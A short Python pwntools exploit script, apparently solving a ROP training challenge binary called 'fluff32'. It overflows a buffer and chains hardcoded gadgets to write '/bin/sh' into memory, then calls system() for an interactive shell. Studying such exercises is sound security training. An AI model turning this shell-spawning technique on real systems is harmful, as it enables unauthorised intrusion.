from pwn import *
import sys

# config
context(os="linux", arch="i386")
context.log_level = "debug"

FILE_NAME = "./fluff32"
HOST = ""
PORT = 0

if len(sys.argv) > 1 and sys.argv[1] == "r":
    conn = remote(HOST, PORT)
else:
    conn = process(FILE_NAME)

# elf=ELF(FILE_NAME)
# addr_main=elf.symbols["main"]
# addr_bss=elf.bss()

buflen = 0x28+4
system = 0x08048430
bss = 0x0804a040

xor_edx_edx = 0x08048671
pop_ebx = 0x080483e1
xor_edx_ebx = 0x0804867b  # pad4
xchg_edx_ecx = 0x08048689  # pad4
mov_ecx_edx = 0x08048693


def main():

    payload = b"A"*buflen

# ---
    payload += p32(xor_edx_edx)
    payload += b"BBBB"

    payload += p32(pop_ebx)
    payload += p32(bss)

    payload += p32(xor_edx_ebx)
    payload += b"BBBB"

    payload += p32(xchg_edx_ecx)
    payload += b"BBBB"
# ---
    payload += p32(xor_edx_edx)
    payload += b"BBBB"

    payload += p32(pop_ebx)
    payload += b"/bin"

    payload += p32(xor_edx_ebx)
    payload += b"BBBB"

    payload += p32(mov_ecx_edx)
    payload += b"BBBB"
    payload += p32(0)
# ---
    payload += p32(xor_edx_edx)
    payload += b"BBBB"

    payload += p32(pop_ebx)
    payload += p32(bss+4)

    payload += p32(xor_edx_ebx)
    payload += b"BBBB"

    payload += p32(xchg_edx_ecx)
    payload += b"BBBB"
# ---
    payload += p32(xor_edx_edx)
    payload += b"BBBB"

    payload += p32(pop_ebx)
    payload += b"/sh\x00"

    payload += p32(xor_edx_ebx)
    payload += b"BBBB"

    payload += p32(mov_ecx_edx)
    payload += b"BBBB"
    payload += p32(0)
# ---
    payload += p32(system)
    payload += b"BBBB"
    payload += p32(bss)

    conn.sendlineafter("> ", payload)
    conn.interactive()


if __name__ == "__main__":
    main()
